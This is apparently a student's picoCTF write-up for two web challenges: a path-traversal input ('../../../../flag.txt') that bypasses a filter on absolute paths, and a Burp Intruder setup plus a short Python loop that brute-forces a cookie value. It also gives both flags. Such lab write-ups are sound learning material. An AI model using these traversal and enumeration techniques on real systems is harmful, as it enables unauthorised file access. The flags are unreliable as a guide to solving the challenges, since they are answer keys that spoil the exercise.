# SOAP


# Forbidden Paths

**Flag:** `picoCTF{7h3_p47h_70_5ucc355_6db46514}`

**Solution:**
- The main hint in the challenge was the fact that the website was filtering *absolute* file paths. 
- I noticed the .txt files listed on the website given. http://saturn.picoctf.net:<port\>.
- ![forbidden paths](https://github.com/teayahz/cryptonite_taskphase_tia/blob/main/picoCTF/images/webex1.JPG?raw=true)
- By using the knowledge of absolute vs relative paths, I remembered relative paths don't start with a `/`(root directory), and that other directories in the path can be represented by `../` .
- To get the file, I entered `../../../../flag.txt` as the description said the file was in `/usr/share/nginx/html/`.


**Concepts learnt:**
1.  I recalled the use of `..` to symbolise parent directory.

**Mistakes & other approaches:**
- First, I tried editing the URL directly with the path provided and it didn't work. 
- I also tried entering the given files names on the home page, but they seemed to be not be found

# Cookies

**Flag:** `picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}`

**Solution:**
- The challenge provides a website with an input box for types of cookies. So, I entered various cookie names such as snickerdoodle, chocolate chip, gingerbread, crinkle, etc and observed the *cookie* values change from 0 to ~25 in the Application tab, where -1 was the initial value.
- I realised a specific value of the cookie gives the flag. I installed *Burp Suite (Community Edition)* for the purpose of checking the response upon changing cookie value one by one. 
- I sent  `mercury.picoctf.net:29649/check` to Intruder, set a payload around the cookie value using `Cookie: name=§-1§`. I changed *Payloads* type to numbers and set a range from 0 to 20 and started the attack.
![cookies1.JPG](https://github.com/teayahz/cryptonite_taskphase_tia/blob/main/picoCTF/images/cookies1.JPG?raw=true)
 
 - The output had columns like the request number, payload, length, response received and status code. I then went to settings and scrolled to the `Grep - Match` section and added `picoCTF{` to the search queries to find the flag in the responses. It was found in payload 18 and the length here also differed from the other payload values. 
![cookies2.JPG](https://github.com/teayahz/cryptonite_taskphase_tia/blob/main/picoCTF/images/cookies2.JPG?raw=true)

**Concepts learnt:**
1. Learnt the use of Burp Suite for taking in requests, changing them and generating the required responses.

**Mistakes & other approaches:**
- After finding the value of the cookie, it could also be directly edited in the website to get the flag there.
- A Python script can be used instead of installing Burp Suite, where there's a loop from 1 to 20 to change the value of the cookies and get the response using `import requests`. 
```python
#!/bin/python3
import requests
url = 'http://mercury.picoctf.net:29649/check'
for i in range(20):
    cookies = {'name': str(i)}
    r = requests.get(url,cookies=cookies)
    if 'picoCTF' in r.text:
        print(r.text)
        break
```
The output in the terminal was the code when the cookie is changed to the value having a response with the required flag:
```
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Cookies</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Home</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Cookies</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>

    </div>
</body>

</html>
```

**Resources:**
- https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/settings
- https://pypi.org/project/requests/
